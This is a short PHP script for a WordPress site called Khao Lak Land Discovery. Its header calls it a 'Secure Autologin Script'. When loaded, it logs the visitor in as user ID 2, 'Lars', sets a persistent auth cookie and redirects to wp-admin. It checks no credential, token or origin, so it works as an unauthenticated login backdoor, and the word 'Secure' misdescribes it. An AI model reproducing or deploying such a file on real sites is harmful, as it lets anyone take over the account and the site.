<?php
/**
 * Secure Autologin Script for Khao Lak Land Discovery
 * User: Lars (ID 2)
 */
require_once 'wp-load.php';

$user_id = 2; // User: Lars
$user = get_user_by('id', $user_id);

if ($user) {
    wp_set_current_user($user_id, $user->user_login);
    wp_set_auth_cookie($user_id, true);
    do_action('wp_login', $user->user_login, $user);
    
    echo '<h1>Success!</h1>';
    echo '<p>Logging you in as ' . esc_html($user->user_login) . '...</p>';
    echo '<script>window.location.href = "wp-admin/";</script>';
} else {
    die('Error: User not found.');
}
